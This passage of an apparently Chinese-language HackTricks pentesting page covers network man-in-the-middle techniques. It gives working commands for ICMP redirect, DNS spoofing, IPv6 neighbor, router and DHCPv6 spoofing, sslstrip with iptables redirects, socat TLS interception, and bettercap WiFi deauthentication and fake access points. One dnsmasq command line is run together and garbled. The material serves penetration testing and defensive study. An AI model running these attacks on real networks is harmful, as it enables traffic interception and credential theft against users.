ICMP Redirect 是通过发送 ICMP packet type 1 code 5 来实现的，该报文表明 attacker 是到达某个 IP 的最佳路径。然后，当 victim 想要联系该 IP 时，会通过 attacker 转发该 packet。
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

attacker 将解析 victim 请求的一些（或全部）域名。
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**使用 dnsmasq 配置自己的 DNS**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### 本地网关

本地通常存在多条通往系统和网络的路由。在构建了本地网络中 MAC addresses 的列表之后，使用 _gateway-finder.py_ 来识别支持 IPv4 forwarding 的主机。
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

当 DNS 查询失败时，本地主机解析在 Microsoft 系统中依赖 **Link-Local Multicast Name Resolution (LLMNR)** 和 **NetBIOS Name Service (NBT-NS)**。类似地，**Apple Bonjour** 和 **Linux zero-configuration** 实现使用 **Multicast DNS (mDNS)** 在网络中发现主机。由于这些协议未经认证且在 UDP 上以广播方式工作，攻击者可以利用它们将用户重定向到恶意服务。

可以使用 Responder 向主机发送伪造响应，冒充主机查找的服务。\
更多关于 [如何使用 Responder 冒充服务](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) 的信息请阅读此处。

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

浏览器通常使用 **Web Proxy Auto-Discovery (WPAD) 协议自动获取代理设置**。这涉及从服务器获取配置（例如通过 URL "http://wpad.example.org/wpad.dat"）。客户端发现该服务器可以通过多种机制发生：

- 通过 **DHCP**，使用特殊的 252 条目来进行发现。
- 通过 **DNS**，在本地域中搜索名为 _wpad_ 的主机名。
- 通过 **Microsoft LLMNR and NBT-NS**，作为 DNS 查询失败时的回退机制。

工具 Responder 利用该协议充当 **恶意 WPAD 服务器**。它使用 DHCP、DNS、LLMNR 和 NBT-NS 误导客户端连接到它。要深入了解如何使用 Responder 冒充服务，请[查看此处](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)。

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

你可以在网络中提供不同的服务，试图**诱骗用户**输入某些**明文凭证**。关于此攻击的**更多信息**见 [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)。

### IPv6 Neighbor Spoofing

这种攻击与 ARP Spoofing 在 IPv6 环境中非常相似。你可以让受害者认为网关的 IPv6 地址对应的是攻击者的 MAC 地址。
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

一些 OS 默认会根据网络中发送的 RA 数据包配置网关。要将攻击者声明为 IPv6 router，你可以使用：
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

默认情况下，一些 OS 会尝试通过读取网络中的 DHCPv6 包来配置 DNS。然后，攻击者可以发送 DHCPv6 包，将自己配置为 DNS。DHCP 也会为受害者提供 IPv6 地址。
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (fake page and JS code injection)

## 互联网攻击

### sslStrip

基本上，这个攻击的作用是，如果 **user** 试图 **access** 一个 **HTTP** 页面并被 **redirecting** 到 **HTTPS** 版本，**sslStrip** 会 **maintain** 一个 **HTTP connection with** 该 **client and** 一个 **HTTPS connection with** 该 **server**，因此它将能够 **sniff** 该连接的 **plain text**。
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
更多信息 [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ and dns2proxy 用于绕过 HSTS

与 **sslStrip** 相比，**sslStrip+ and dns2proxy** 的**区别**在于它们会**重定向**例如 _**www.facebook.com**_ **到** _**wwww.facebook.com**_（注意**额外**的“**w**”）并将**该域名的地址设为攻击者 IP**。这样，**客户端**会**连接**到 _**wwww.facebook.com**_（攻击者），但在幕后，**sslstrip+**会通过 https 与 **www.facebook.com** **维护**真实的连接。

该技术的**目标**是**绕过 HSTS**，因为 _**wwww**.facebook.com_ **不会**被保存在浏览器的**缓存**中，因此浏览器会被欺骗以通过 **HTTP** 执行 **facebook 身份验证**。\
注意，为执行此攻击，受害者必须最初尝试访问 [http://www.faceook.com](http://www.faceook.com) 而不是 https。这可以通过修改 http 页面内的链接来完成。

更多信息 [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) 和 [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip or sslStrip+ 不再可行。原因是浏览器中预存了 HSTS 规则，所以即使用户第一次访问一个“重要”域，他也会通过 HTTPS 访问。此外，请注意预存规则和其他生成的规则可以使用标志** [**`includeSubdomains`**](https://hstspreload.appspot.com) **因此之前的** _**wwww.facebook.com**_ **示例将不再有效，因为** _**facebook.com**_ **使用带有 `includeSubdomains` 的 HSTS。**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP 监听端口
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL 在端口上监听

#### 生成密钥和自签名证书
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### 使用证书进行监听
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### 使用证书监听并重定向到主机
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
有时，如果客户端检查 CA 是否为有效的，你可以 **serve a certificate of other hostname signed by a CA**.\
另一个有趣的测试，是提供一个 c**ertificate of the requested hostname but self-signed**。

其他要测试的情况包括尝试用一个虽然是 valid certificate 但并非有效 CA 的 certificate 来签名。或者使用有效的 public key，强制使用像 diffie hellman 这样的算法（这种算法不需要用真实的 private key 去解密任何东西），当客户端请求对真实 private key 的 probe（比如 hash）时，发送一个假的 probe，并期望客户端不会去检查它。

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### 主动发现说明

Take into account that when a UDP packet is sent to a device that do not have the requested port an ICMP (Port Unreachable) is sent.

### **ARP discover**

ARP 包用于发现网络中正在使用的 IP。主机必须对每个可能的 IP 地址发送请求，只有正在使用的地址才会响应。

### **mDNS (multicast DNS)**

Bettercap send a MDNS request (each X ms) asking for **\_services\_.dns-sd.\_udp.local** the machine that see this paket usually answer this request. Then, it only searchs for machine answering to "services".

**工具**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap broadcast packets to the port 137/UDP asking for the name "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap broadcast SSDP packets searching for all kind of services (UDP Port 1900).

### **WSD (Web Service Discovery)**

Bettercap broadcast WSD packets searching for services (UDP Port 3702).


### Telecom / Mobile-Core (GTP) Exploitation


{{#ref}}
telecom-network-exploitation.md
{{#endref}}

## 参考资料

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3rd edition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)



{{#include ../../banners/hacktricks-training.md}}
